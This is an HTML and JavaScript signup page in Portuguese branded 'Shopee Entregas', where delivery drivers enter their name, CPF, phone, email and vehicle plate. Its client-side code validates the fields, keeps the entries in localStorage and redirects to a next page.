<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cadastro - Shopee Entregas</title>
  <style>
    :root {
      --primary-color: #ee4d2d;
      --primary-dark: #d03a1b;
      --secondary-color: #0066cc;
      --text-color: #333;
      --light-bg: #f8f9fa;
      --border-radius: 8px;
      --card-shadow: 0 2px 8px rgba(0,0,0,0.1);
      --transition: all 0.3s ease;
    }
    
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      line-height: 1.6;
      color: var(--text-color);
      background-color: var(--light-bg);
    }
    
    header {
      background-color: var(--primary-color);
      padding: 1.5rem 1rem;
      color: white;
      text-align: center;
      position: sticky;
      top: 0;
      z-index: 100;
      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }
    
    header h1 {
      margin: 0;
      font-size: 1.8rem;
    }
    
    header p {
      margin: 0.25rem 0 0;
      font-size: 1rem;
      opacity: 0.9;
    }
    
    main {
      max-width: 800px;
      margin: 2rem auto;
      padding: 1rem;
    }
    
    .breadcrumb {
      display: flex;
      margin-bottom: 1.5rem;
      font-size: 0.9rem;
    }
    
    .breadcrumb a {
      color: var(--secondary-color);
      text-decoration: none;
    }
    
    .breadcrumb span {
      margin: 0 0.5rem;
      color: #999;
    }
    
    .form-container {
      background-color: white;
      border-radius: var(--border-radius);
      padding: 2rem;
      box-shadow: var(--card-shadow);
    }
    
    .form-header {
      margin-bottom: 2rem;
      text-align: center;
    }
    
    .form-header h2 {
      color: var(--primary-color);
      margin-bottom: 0.5rem;
    }
    
    .form-header p {
      color: #666;
    }
    
    .form-group {
      margin-bottom: 1.5rem;
    }
    
    .form-group label {
      display: block;
      margin-bottom: 0.5rem;
      font-weight: bold;
    }
    
    .form-group input,
    .form-group select {
      width: 100%;
      padding: 0.8rem;
      border: 1px solid #ddd;
      border-radius: 4px;
      font-size: 1rem;
    }
    
    .form-group input:focus,
    .form-group select:focus {
      outline: none;
      border-color: var(--primary-color);
      box-shadow: 0 0 0 3px rgba(238, 77, 45, 0.1);
    }
    
    .form-group .error {
      color: red;
      font-size: 0.85rem;
      margin-top: 0.5rem;
    }
    
    .form-row {
      display: flex;
      gap: 1rem;
    }
    
    .form-row .form-group {
      flex: 1;
    }
    
    .vehicle-type-section {
      margin-bottom: 1.5rem;
    }
    
    .vehicle-type-section h3 {
      margin-bottom: 1rem;
      font-size: 1.1rem;
    }
    
    .vehicle-options {
      display: flex;
      gap: 1rem;
      flex-wrap: wrap;
    }
    
    .vehicle-option {
      flex: 1;
      min-width: 200px;
      border: 2px solid #ddd;
      border-radius: var(--border-radius);
      padding: 1rem;
      text-align: center;
      cursor: pointer;
      transition: var(--transition);
    }
    
    .vehicle-option.selected {
      border-color: var(--primary-color);
      background-color: rgba(238, 77, 45, 0.05);
    }
    
    .vehicle-option img {
      max-width: 120px;
      height: auto;
      margin-bottom: 1rem;
    }
    
    .vehicle-option h4 {
      margin-bottom: 0.5rem;
      color: var(--text-color);
    }
    
    .vehicle-option p {
      font-size: 0.9rem;
      color: #666;
    }
    
    .form-actions {
      display: flex;
      justify-content: space-between;
      margin-top: 2rem;
    }
    
    .btn {
      padding: 0.8rem 1.5rem;
      border-radius: 4px;
      font-weight: bold;
      cursor: pointer;
      transition: var(--transition);
      font-size: 1rem;
    }
    
    .btn-primary {
      background-color: var(--primary-color);
      color: white;
      border: none;
    }
    
    .btn-primary:hover {
      background-color: var(--primary-dark);
    }
    
    .btn-secondary {
      background-color: #f1f1f1;
      border: none;
      color: #333;
    }
    
    .btn-secondary:hover {
      background-color: #e1e1e1;
    }
    
    footer {
      background-color: #333;
      color: white;
      padding: 2rem 1rem;
      text-align: center;
      margin-top: 3rem;
    }
    
    footer p {
      margin-bottom: 1rem;
    }
    
    .footer-links {
      margin-bottom: 1rem;
    }
    
    .footer-links a {
      color: #ddd;
      margin: 0 0.5rem;
      text-decoration: none;
    }
    
    .footer-links a:hover {
      color: white;
      text-decoration: underline;
    }
    
    @media (max-width: 768px) {
      .form-row {
        flex-direction: column;
        gap: 0;
      }
      
      .vehicle-option {
        flex: none;
        width: 100%;
      }
    }
  </style>
</head>
<body>
  <header>
    <h1>Shopee Entregas</h1>
    <p>Portal do Entregador Parceiro</p>
  </header>
  
  <main>
    <div class="breadcrumb">
      <a href="/">Home</a>
      <span>/</span>
      <strong>Cadastro</strong>
    </div>
    
    <div class="form-container">
      <div class="form-header">
        <h2>Cadastro de Entregador</h2>
        <p>Preencha seus dados para se tornar um entregador parceiro</p>
      </div>
      
      <form id="cadastro-form">
        <div class="form-group">
          <label for="nome">Nome Completo</label>
          <input type="text" id="nome" name="nome" required>
          <div class="error" id="nome-error"></div>
        </div>
        
        <div class="form-row">
          <div class="form-group">
            <label for="cpf">CPF</label>
            <input type="text" id="cpf" name="cpf" placeholder="000.000.000-00" required>
            <div class="error" id="cpf-error"></div>
          </div>
          
          <div class="form-group">
            <label for="telefone">Telefone</label>
            <input type="text" id="telefone" name="telefone" placeholder="(00) 00000-0000" required>
            <div class="error" id="telefone-error"></div>
          </div>
        </div>
        
        <div class="form-group">
          <label for="email">E-mail</label>
          <input type="email" id="email" name="email" required>
          <div class="error" id="email-error"></div>
        </div>
        
        <div class="form-row">
          <div class="form-group">
            <label for="cep">CEP</label>
            <input type="text" id="cep" name="cep" required readonly>
          </div>
          
          <div class="form-group">
            <label for="cidade">Cidade</label>
            <input type="text" id="cidade" name="cidade" required readonly>
          </div>
          
          <div class="form-group">
            <label for="estado">Estado</label>
            <input type="text" id="estado" name="estado" required readonly>
          </div>
        </div>
        
        <div class="form-group">
          <label for="placa">Placa do Veículo</label>
          <input type="text" id="placa" name="placa" placeholder="ABC-1234" required>
          <div class="error" id="placa-error"></div>
        </div>
        
        <div class="vehicle-type-section">
          <h3>Tipo de Veículo</h3>
          <div class="vehicle-options">
            <div class="vehicle-option" data-value="carro" id="option-carro">
              <img src="https://i.imgur.com/rLOHFJI.jpg" alt="Carro">
              <h4>Carro</h4>
              <p>Ideal para entregas de volumes maiores</p>
            </div>
            
            <div class="vehicle-option" data-value="moto" id="option-moto">
              <img src="https://i.imgur.com/ZW5OhD6.jpg" alt="Moto">
              <h4>Moto</h4>
              <p>Perfeito para entregas rápidas</p>
            </div>
          </div>
          <input type="hidden" id="tipoVeiculo" name="tipoVeiculo" value="" required>
          <div class="error" id="tipoVeiculo-error"></div>
        </div>
        
        <div class="form-actions">
          <button type="button" class="btn btn-secondary" id="btn-voltar">Voltar</button>
          <button type="submit" class="btn btn-primary" id="btn-continuar">Continuar</button>
        </div>
      </form>
    </div>
  </main>
  
  <footer>
    <p>&copy; 2025 Shopee Entregas. Todos os direitos reservados.</p>
    <div class="footer-links">
      <a href="#">Termos de Uso</a>
      <a href="#">Política de Privacidade</a>
      <a href="#">Contato</a>
    </div>
  </footer>

  <script>
    // Elementos do DOM
    const form = document.getElementById('cadastro-form');
    const nomeInput = document.getElementById('nome');
    const cpfInput = document.getElementById('cpf');
    const telefoneInput = document.getElementById('telefone');
    const emailInput = document.getElementById('email');
    const cepInput = document.getElementById('cep');
    const cidadeInput = document.getElementById('cidade');
    const estadoInput = document.getElementById('estado');
    const placaInput = document.getElementById('placa');
    const tipoVeiculoInput = document.getElementById('tipoVeiculo');
    const optionCarro = document.getElementById('option-carro');
    const optionMoto = document.getElementById('option-moto');
    const btnVoltar = document.getElementById('btn-voltar');
    
    // Validação de CPF
    function isValidCPF(cpf) {
      cpf = cpf.replace(/[^\d]/g, '');
      if (cpf.length !== 11) return false;
      
      // Verificar se todos os dígitos são iguais
      if (/^(\d)\1+$/.test(cpf)) return false;
      
      // Validar dígitos verificadores
      let sum = 0;
      let remainder;
      
      // Primeiro dígito verificador
      for (let i = 1; i <= 9; i++) {
        sum += parseInt(cpf.substring(i - 1, i)) * (11 - i);
      }
      
      remainder = (sum * 10) % 11;
      if (remainder === 10 || remainder === 11) remainder = 0;
      if (remainder !== parseInt(cpf.substring(9, 10))) return false;
      
      // Segundo dígito verificador
      sum = 0;
      for (let i = 1; i <= 10; i++) {
        sum += parseInt(cpf.substring(i - 1, i)) * (12 - i);
      }
      
      remainder = (sum * 10) % 11;
      if (remainder === 10 || remainder === 11) remainder = 0;
      if (remainder !== parseInt(cpf.substring(10, 11))) return false;
      
      return true;
    }
    
    // Formatação de CPF
    function formatCPF(cpf) {
      cpf = cpf.replace(/\D/g, '');
      return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
    }
    
    // Formatação de telefone
    function formatTelefone(telefone) {
      telefone = telefone.replace(/\D/g, '');
      if (telefone.length === 11) {
        return telefone.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
      }
      return telefone.replace(/(\d{2})(\d{4})(\d{4})/, '($1) $2-$3');
    }
    
    // Formatação de placa
    function formatPlaca(placa) {
      // Formato antigo: ABC-1234
      // Formato novo: ABC1D23
      placa = placa.toUpperCase().replace(/[^A-Z0-9]/g, '');
      
      if (placa.length <= 7) {
        if (/^[A-Z]{3}\d{4}$/.test(placa)) {
          // Formato antigo
          return placa.replace(/([A-Z]{3})(\d{4})/, '$1-$2');
        } else if (/^[A-Z]{3}\d[A-Z]\d{2}$/.test(placa)) {
          // Formato Mercosul
          return placa;
        }
      }
      
      return placa;
    }
    
    // Carregar dados do localStorage
    function loadStoredData() {
      // Verificar se temos dados do CEP
      const cepData = localStorage.getItem('cepData');
      if (cepData) {
        const data = JSON.parse(cepData);
        cepInput.value = data.cep;
        cidadeInput.value = data.city;
        estadoInput.value = data.state;
      } else {
        // Se não tiver CEP, redirecionar para home
        alert('Por favor, informe seu CEP na página inicial.');
        window.location.href = '/';
        return false;
      }
      
      // Verificar se já temos dados do usuário salvos
      const userData = localStorage.getItem('userData');
      if (userData) {
        const data = JSON.parse(userData);
        nomeInput.value = data.nome || '';
        cpfInput.value = data.cpf || '';
        telefoneInput.value = data.telefone || '';
        emailInput.value = data.email || '';
        placaInput.value = data.placa || '';
        
        if (data.tipoVeiculo === 'carro') {
          optionCarro.classList.add('selected');
          tipoVeiculoInput.value = 'carro';
        } else if (data.tipoVeiculo === 'moto') {
          optionMoto.classList.add('selected');
          tipoVeiculoInput.value = 'moto';
        }
      }
      
      return true;
    }
    
    // Manipular seleção de tipo de veículo
    optionCarro.addEventListener('click', () => {
      optionCarro.classList.add('selected');
      optionMoto.classList.remove('selected');
      tipoVeiculoInput.value = 'carro';
      document.getElementById('tipoVeiculo-error').textContent = '';
    });
    
    optionMoto.addEventListener('click', () => {
      optionMoto.classList.add('selected');
      optionCarro.classList.remove('selected');
      tipoVeiculoInput.value = 'moto';
      document.getElementById('tipoVeiculo-error').textContent = '';
    });
    
    // Validar formulário
    function validateForm() {
      let isValid = true;
      
      // Validar nome
      if (!nomeInput.value.trim()) {
        document.getElementById('nome-error').textContent = 'Nome é obrigatório';
        isValid = false;
      } else if (nomeInput.value.trim().length < 3) {
        document.getElementById('nome-error').textContent = 'Nome deve ter pelo menos 3 caracteres';
        isValid = false;
      } else {
        document.getElementById('nome-error').textContent = '';
      }
      
      // Validar CPF
      const cpf = cpfInput.value.replace(/\D/g, '');
      if (!cpf) {
        document.getElementById('cpf-error').textContent = 'CPF é obrigatório';
        isValid = false;
      } else if (!isValidCPF(cpf)) {
        document.getElementById('cpf-error').textContent = 'CPF inválido';
        isValid = false;
      } else {
        document.getElementById('cpf-error').textContent = '';
      }
      
      // Validar telefone
      const telefone = telefoneInput.value.replace(/\D/g, '');
      if (!telefone) {
        document.getElementById('telefone-error').textContent = 'Telefone é obrigatório';
        isValid = false;
      } else if (telefone.length < 10 || telefone.length > 11) {
        document.getElementById('telefone-error').textContent = 'Telefone inválido';
        isValid = false;
      } else {
        document.getElementById('telefone-error').textContent = '';
      }
      
      // Validar email
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (!emailInput.value.trim()) {
        document.getElementById('email-error').textContent = 'E-mail é obrigatório';
        isValid = false;
      } else if (!emailRegex.test(emailInput.value.trim())) {
        document.getElementById('email-error').textContent = 'E-mail inválido';
        isValid = false;
      } else {
        document.getElementById('email-error').textContent = '';
      }
      
      // Validar placa
      const placa = placaInput.value.trim().toUpperCase();
      if (!placa) {
        document.getElementById('placa-error').textContent = 'Placa é obrigatória';
        isValid = false;
      } else if (!/^[A-Z]{3}[-]?\d{4}$/.test(placa) && !/^[A-Z]{3}\d[A-Z]\d{2}$/.test(placa)) {
        document.getElementById('placa-error').textContent = 'Placa inválida';
        isValid = false;
      } else {
        document.getElementById('placa-error').textContent = '';
      }
      
      // Validar tipo de veículo
      if (!tipoVeiculoInput.value) {
        document.getElementById('tipoVeiculo-error').textContent = 'Selecione um tipo de veículo';
        isValid = false;
      } else {
        document.getElementById('tipoVeiculo-error').textContent = '';
      }
      
      return isValid;
    }
    
    // Manipular formatação em tempo real
    cpfInput.addEventListener('input', (e) => {
      const rawValue = e.target.value.replace(/\D/g, '');
      if (rawValue.length <= 11) {
        e.target.value = formatCPF(rawValue);
      }
    });
    
    telefoneInput.addEventListener('input', (e) => {
      const rawValue = e.target.value.replace(/\D/g, '');
      if (rawValue.length <= 11) {
        e.target.value = formatTelefone(rawValue);
      }
    });
    
    placaInput.addEventListener('input', (e) => {
      e.target.value = formatPlaca(e.target.value);
    });
    
    // Manipular envio do formulário
    form.addEventListener('submit', (e) => {
      e.preventDefault();
      
      if (validateForm()) {
        // Salvar dados no localStorage
        const userData = {
          nome: nomeInput.value.trim(),
          cpf: cpfInput.value,
          telefone: telefoneInput.value,
          email: emailInput.value.trim(),
          placa: placaInput.value.toUpperCase(),
          tipoVeiculo: tipoVeiculoInput.value,
          cep: cepInput.value,
          cidade: cidadeInput.value,
          estado: estadoInput.value
        };
        
        localStorage.setItem('userData', JSON.stringify(userData));
        
        // Redirecionar para a próxima página
        window.location.href = '/municipios';
      }
    });
    
    // Botão voltar
    btnVoltar.addEventListener('click', () => {
      window.location.href = '/';
    });
    
    // Inicializar página
    document.addEventListener('DOMContentLoaded', () => {
      // Carregar dados do localStorage
      if (!loadStoredData()) {
        return;
      }
    });
  </script>
</body>
</html>